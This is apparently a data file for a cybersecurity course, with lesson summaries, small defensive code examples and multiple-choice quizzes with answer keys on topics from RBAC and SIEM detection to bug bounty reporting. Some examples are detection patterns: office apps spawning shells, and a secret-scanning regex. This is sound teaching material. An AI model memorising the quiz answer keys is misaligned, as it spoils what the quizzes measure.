      'Just-in-time, time-boxed admin access shrinks the window of risk.',
    ],
    example: {
      label: 'Resolve a user\'s effective permissions through RBAC',
      lang: 'python',
      code: `role_perms = {"viewer": {"read"}, "editor": {"read", "write"}, "admin": {"read", "write", "delete", "grant"}}
user_roles = {"ava": ["editor"], "ben": ["viewer"], "cy": ["editor", "admin"]}

for user, roles in user_roles.items():
    perms = set().union(*(role_perms[r] for r in roles))
    print(f"{user:4} {sorted(perms)}")`,
    },
    check: {
      question: 'Which authentication factor best resists phishing?',
      options: ['SMS one-time codes', 'Authenticator-app TOTP codes', 'FIDO2 hardware keys or passkeys', 'Security questions'],
      answer: 2,
      explanation: 'FIDO2 binds the login to the real site, so a proxy cannot relay the credential to the attacker.',
    },
  },

  [`${C}/firewalls-ids-ips`]: {
    answer: 'Firewalls control which traffic is allowed. Stateful firewalls track connections so replies are permitted automatically; next-generation firewalls inspect up to the application layer, identifying apps and users. IDS alerts on suspicious traffic; IPS sits inline and can block it. A default-deny policy makes every allowed flow explicit.',
    points: [
      'Default deny forces review of every new flow.',
      'TLS inspection is needed to see inside encrypted traffic.',
      'Tune detection before an IPS blocks, or it drops legitimate traffic.',
    ],
    example: {
      label: 'Default-deny evaluation of outbound flows',
      lang: 'python',
      code: `allow = {("app", "database", 5432), ("app", "updates", 443)}
flows = [("app", "database", 5432), ("app", "unknown-host", 443), ("app", "database", 22)]
for src, dst, port in flows:
    print(f"{src} -> {dst}:{port}", "allow" if (src, dst, port) in allow else "deny (default)")`,
    },
    check: {
      question: 'What is the difference between an IDS and an IPS?',
      options: ['An IDS blocks traffic; an IPS only logs', 'An IDS alerts; an IPS sits inline and can block', 'They are identical', 'An IPS is only for email'],
      answer: 1,
      explanation: 'Detection systems observe and alert; prevention systems are placed inline to stop traffic.',
    },
  },

  [`${C}/siem-log-analysis`]: {
    answer: 'A SIEM centralises logs from across the estate, normalises them, correlates events and raises alerts on attack patterns. High-value sources include authentication logs, process creation, DNS, and cloud API logs. Good detection rules are specific enough to be actionable and tuned to cut false positives.',
    points: [
      'Collect logs off the host so an attacker cannot erase them.',
      'Some high-value logging (process creation, PowerShell) is off by default.',
      'Correlation across sources reveals what one log alone cannot.',
    ],
    example: {
      label: 'A simple brute-force detection over auth logs',
      lang: 'python',
      code: `from collections import Counter

events = [("ava", "fail"), ("ava", "fail"), ("ben", "ok"), ("ava", "fail"),
          ("ava", "fail"), ("ava", "fail"), ("ava", "ok")]
fails = Counter(u for u, result in events if result == "fail")
for user, n in fails.items():
    if n >= 5:
        print(f"alert: {n} failed logins for {user} before success")`,
    },
    check: {
      question: 'Why forward logs to a central SIEM instead of keeping them only on each host?',
      options: ['It saves disk on the SIEM', 'An attacker who compromises a host cannot erase the off-host copy', 'Hosts cannot store logs', 'It is faster to type'],
      answer: 1,
      explanation: 'Clearing local logs is a common step; a central copy preserves the evidence and enables correlation.',
    },
  },

  [`${C}/vulnerability-management`]: {
    answer: 'Vulnerability management is a continuous loop: discover assets, scan them (authenticated scans find far more), prioritise by real risk, remediate within SLAs, and verify. Prioritise with EPSS (exploit probability), the CISA KEV list (confirmed exploitation) and asset criticality, not CVSS alone.',
    points: [
      'Authenticated scans see far more than unauthenticated ones.',
      'Set SLAs by severity and exposure; internet-facing comes first.',
      'Track mean time to remediate as a programme metric.',
    ],
    example: {
      label: 'Assign a remediation SLA from risk signals',
      lang: 'python',
      code: `def sla_days(kev, internet, cvss):
    if kev and internet: return 2
    if kev or (internet and cvss >= 7): return 7
    if cvss >= 7: return 30
    return 90

for v in [("A", True, True, 9.8), ("B", False, True, 7.5), ("C", False, False, 5.0)]:
    cve, kev, net, cvss = v
    print(f"{cve}: patch within {sla_days(kev, net, cvss)} days")`,
    },
    check: {
      question: 'Why use EPSS and CISA KEV alongside CVSS for prioritisation?',
      options: ['CVSS is always wrong', 'They add how likely or confirmed exploitation is, which severity alone does not', 'They replace scanning', 'They are required by law'],
      answer: 1,
      explanation: 'A high-severity bug nobody exploits can wait behind a medium-severity one under active attack.',
    },
  },

  [`${C}/incident-response`]: {
    answer: 'Incident response follows six phases (SANS PICERL): preparation, identification, containment, eradication, recovery and lessons learned. Outcomes are largely decided in advance by practised plans, deployed tools and pre-agreed contacts. Evidence is collected in order of volatility: memory before disk.',
    points: [
      'Contain before eradicating, so the attacker cannot react.',
      'Memory is lost on reboot, so capture it first.',
      'The lessons-learned review turns one incident into lasting improvement.',
    ],
    example: {
      label: 'Collect evidence in order of volatility',
      lang: 'python',
      code: `sources = [("disk image", 3), ("memory (RAM)", 1), ("network connections", 2), ("backups", 4)]
for name, order in sorted(sources, key=lambda s: s[1]):
    print(f"{order}. {name}")`,
    },
    check: {
      question: 'Why collect memory before imaging the disk?',
      options: ['Memory is larger', 'Memory is volatile and lost on reboot, while disk persists', 'Disk cannot be imaged', 'It is alphabetical'],
      answer: 1,
      explanation: 'RAM holds running processes, keys and network state that vanish when the machine powers off.',
    },
  },

  [`${C}/threat-intelligence-hunting`]: {
    answer: 'Threat intelligence informs defence at four levels: strategic (trends), operational (campaigns), tactical (techniques) and technical (indicators). Threat hunting is proactive: a hunter forms a hypothesis from known attacker techniques and searches the data for evidence, instead of waiting for an alert.',
    points: [
      'The Traffic Light Protocol controls how shared intelligence may be redistributed.',
      'Indicators age quickly; techniques (TTPs) last longer.',
      'A hunt that finds nothing still validates coverage.',
    ],
    example: {
      label: 'A hunt hypothesis checked against process logs',
      lang: 'python',
      code: `# hypothesis: an office document spawned a script interpreter (suspicious)
events = [("winword.exe", "powershell.exe"), ("explorer.exe", "chrome.exe"),
          ("excel.exe", "cmd.exe"), ("outlook.exe", "winword.exe")]
office = {"winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe"}
shells = {"powershell.exe", "cmd.exe", "wscript.exe"}
for parent, child in events:
    if parent in office and child in shells:
        print(f"investigate: {parent} spawned {child}")`,
    },
    check: {
      question: 'How does threat hunting differ from alert triage?',
      options: ['It waits for alerts', 'It proactively searches for attacker activity from a hypothesis', 'It only reads the news', 'It disables logging'],
      answer: 1,
      explanation: 'Hunting assumes something may have slipped past detections and goes looking for it.',
    },
  },

  [`${C}/devsecops`]: {
    answer: 'DevSecOps builds security into the delivery pipeline as continuous guardrails rather than a final gate. SAST scans code on each commit, SCA flags vulnerable dependencies, DAST tests the running app, secrets scanning stops credentials being committed, and infrastructure-as-code is scanned before deploy.',
    points: [
      'Fixing issues early is far cheaper than after release.',
      'SAST reads code; DAST exercises the running application.',
      'Fail the build on secrets and critical findings.',
    ],
    example: {
      label: 'A pre-commit secret scan blocking a credential',
      lang: 'python',
      code: `import re

diff = ['+ DATABASE_URL = os.environ["DATABASE_URL"]', '+ AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCY"']
secret = re.compile(r'(secret|password|key)\\s*=\\s*["\\'][^"\\']{12,}', re.IGNORECASE)
blocked = [line for line in diff if secret.search(line)]
print("commit blocked" if blocked else "commit allowed")
for line in blocked:
    print("  hard-coded secret:", line.split('=')[0].strip('+ '))`,
    },
    check: {
      question: 'What does SCA (software composition analysis) check?',
      options: ['Your own source logic', 'Known vulnerabilities in third-party dependencies', 'Network traffic', 'Disk usage'],
      answer: 1,
      explanation: 'SCA inventories dependencies and flags those with known CVEs; SAST analyses your own code.',
    },
  },

  [`${C}/compliance-frameworks`]: {
    answer: 'Compliance frameworks set baselines: NIST CSF organises security into functions, SOC 2 attests to controls for service providers, ISO 27001 certifies a management system, and PCI-DSS governs card data. Compliance is a floor, not proof of security, and controls overlap so one control library can satisfy several.',
    points: [
      'SOC 2 Type II proves controls worked over a period, not just on one day.',
      'PCI scope reduction (tokenisation, hosted payment pages) cuts the requirements dramatically.',
      'Map one control set to multiple frameworks to avoid duplicate work.',
    ],
    example: {
      label: 'One control satisfying several frameworks',
      lang: 'text',
      code: `Control: enforce MFA on all remote access
  NIST CSF   PR.AC-7 (authentication)
  SOC 2      CC6.1 (logical access)
  ISO 27001  A.8.5 (secure authentication)
  PCI-DSS    8.4 (multi-factor authentication)`,
      static: true,
    },
    check: {
      question: 'Why is SOC 2 Type II generally more valuable than Type I?',
      options: ['It is cheaper', 'It proves controls operated effectively over a period, not just at one point', 'It needs no auditor', 'It covers more countries'],
      answer: 1,
      explanation: 'Type I describes design on a date; Type II tests that the controls actually worked over months.',
    },
  },

  [`${C}/security-certifications`]: {
    answer: 'Certifications open doors, especially in enterprise and government hiring, but employers also want demonstrated skill. For US entry level, CompTIA Security+ is a common first choice; offensive practitioners often follow a practical path toward OSCP; cloud and management roles have their own tracks.',
    points: [
      'Pair any certification with labs, CTFs and write-ups.',
      'Security+ is vendor-neutral and widely listed for entry roles.',
      'Hands-on certs that require real exploitation are hard to fake.',
    ],
    example: {
      label: 'A rough certification path by track',
      lang: 'text',
      code: `Entry / SOC       CompTIA Security+ → CySA+
Penetration test  practical labs → eJPT → OSCP
Cloud security    cloud provider security specialty
Management / GRC  CISSP, CISM`,
      static: true,
    },
    check: {
      question: 'What should accompany a certification to pass technical interviews?',
      options: ['Nothing else is needed', 'Demonstrated skill through labs, CTFs and write-ups', 'More certifications only', 'A faster computer'],
      answer: 1,
      explanation: 'Certifications signal knowledge; portfolios of real work prove you can apply it.',
    },
  },

  [`${C}/bug-bounty-hunting`]: {
    answer: 'Bug bounty programmes give legal permission to test in-scope systems and pay for valid vulnerability reports. Success comes from reading the scope and policy carefully, building a repeatable recon-and-test workflow, writing clear reports with reproduction steps and impact, and choosing programmes that fit your skills.',
    points: [
      'The programme policy is a binding scope; stay inside it.',
      'A clear report with steps and impact gets triaged and paid faster.',
      'Build skills on practice labs before hunting live programmes.',
    ],
    example: {
      label: 'The structure of a good vulnerability report',
      lang: 'text',
      code: `Title     IDOR: any user can read others' invoices via /api/invoices/{id}
Severity  High — exposes other customers' financial data
Steps     1. Log in as user A   2. GET /api/invoices/1002 (user B's)
          3. Server returns B's invoice without an authorisation check
Impact    Confidential data of all customers is readable
Fix       Check the invoice belongs to the authenticated user`,
      static: true,
    },
    check: {
      question: 'What defines what you are allowed to test in a bug bounty programme?',
      options: ['Your own judgement', 'The programme\'s published scope and policy', 'The size of the reward', 'The company\'s revenue'],
      answer: 1,
      explanation: 'The policy is a legal agreement; testing outside the listed scope is not authorised.',
    },
  },

  [`${C}/home-lab-setup`]: {
    answer: 'A home lab is a safe, isolated environment to practise both attack and defence: virtual machines on an isolated network, a vulnerable target or two, a SIEM to collect logs and an IDS to watch traffic. It is a strong portfolio piece and the right place to run anything you must never run on a real network.',
    points: [
      'Keep vulnerable VMs on a host-only or isolated network, never bridged.',
      'Snapshot before each session so you can roll back instantly.',
      'Practising detection teaches as much as practising attacks.',
    ],
    example: {
      label: 'A minimal isolated lab layout',
      lang: 'text',
      code: `Network: host-only, no route to home LAN or internet
  kali / parrot      attacker workstation
  vulnerable VM      intentionally weak target
  windows + AD       realistic enterprise target
  SIEM + IDS         collect logs, watch traffic, write detections
Snapshot every VM after install and before each session.`,
      static: true,
    },
    check: {
      question: 'How should vulnerable practice VMs be networked?',
      options: ['Bridged to the home network', 'On an isolated host-only network with no internet route', 'Exposed to the internet', 'On a friend\'s network'],
      answer: 1,
      explanation: 'Isolation keeps deliberately weak machines from becoming a foothold onto your real network or the internet.',
    },
  },

  [`${C}/interview-prep-security`]: {
    answer: 'Security interviews test reasoning and communication as much as facts. Interviewers look for how you think through a problem, how you explain risk to non-experts, and evidence that you keep learning. A home-lab write-up or CTF solutions often count for more than a second certification.',
    points: [
      'Explain the why, not just the term.',
      'Practise describing a past incident: what, impact, how you responded.',
      'Have one project you can walk through end to end.',
    ],
    example: {
      label: 'Structure an incident answer (STAR)',
      lang: 'text',
      code: `Situation  A phishing email reached several staff inboxes
Task       Contain it before credentials were used
Action     Pulled the message, reset exposed accounts, blocked the domain
Result     No account takeover; added a detection rule for the pattern`,
      static: true,
    },
    check: {
      question: 'What do security interviewers value most alongside knowledge?',
      options: ['Memorised definitions', 'Clear reasoning and communication about risk', 'The longest résumé', 'Typing speed'],
      answer: 1,
      explanation: 'Security work means explaining risk and decisions to others, so how you think and communicate matters.',
    },
  },
}
